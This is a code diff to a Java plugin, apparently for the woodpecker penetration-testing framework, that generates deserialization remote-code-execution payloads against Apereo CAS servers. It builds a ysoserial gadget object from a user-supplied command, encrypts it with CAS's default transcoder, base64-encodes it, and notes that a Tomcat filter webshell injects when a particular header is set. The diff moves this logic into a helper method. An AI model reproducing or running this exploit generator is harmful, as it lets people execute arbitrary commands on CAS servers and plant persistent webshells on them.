@@ -1,9 +1,6 @@
 package me.gv7.woodpecker.plugin.payloads;
 
-import me.gv7.woodpecker.plugin.CasRCE;
-import me.gv7.woodpecker.plugin.IArgs;
-import me.gv7.woodpecker.plugin.IPayloadGenerator;
-import me.gv7.woodpecker.plugin.IResultOutput;
+import me.gv7.woodpecker.plugin.*;
 import org.cryptacular.util.CodecUtil;
 import org.jasig.spring.webflow.plugin.EncryptedTranscoder;
 import ys.payloads.ObjectPayload;
@@ -14,6 +11,7 @@ import java.util.List;
 import java.util.Map;
 
 public class CasPayloadGenerate implements IPayloadGenerator {
+    public static IResultOutput iResultOutput;
     @Override
     public String getPayloadTabCaption() {
         return "CAS execute 反序列化生成器";
@@ -39,21 +37,13 @@ public class CasPayloadGenerate implements IPayloadGenerator {
     }
 
     @Override
-    public void generatorPayload(Map<String, String> customArgs, IResultOutput iResultOutput) {
+    public void generatorPayload(Map<String, String> customArgs, IResultOutput result) {
+        this.iResultOutput = result;
         String className = customArgs.get("gadge");
         String command = customArgs.get("command");
-        iResultOutput.rawPrintln("\n\n调用类: "+className+"\ncommand: "+command+"\n");
-        try {
-            Object o = ObjectPayload.Utils.makePayloadObject(className, command);
-            EncryptedTranscoder transcoder = new EncryptedTranscoder();
-            byte[] aesEncoded = transcoder.encode(o);
-            String b64Encoded = CodecUtil.b64(aesEncoded);
-            String output = "67554b79-6cc1-4d89-a933-e99eb21a0ac2_"+b64Encoded;
-            iResultOutput.successPrintln("TomcatFilterWebshell 设置头为 Accept-Languages 才能正常注入");
-            iResultOutput.successPrintln(URLEncoder.encode(output));
-        }catch (Exception e){
-            iResultOutput.errorPrintln(e.getMessage());
-            iResultOutput.errorPrintln(e.toString());
-        }
+        result.rawPrintln("\n\n调用类: "+className+"\ncommand: "+command+"\n");
+        result.successPrintln(CasCommonUtils.generate(className, command));
     }
+
+
 }
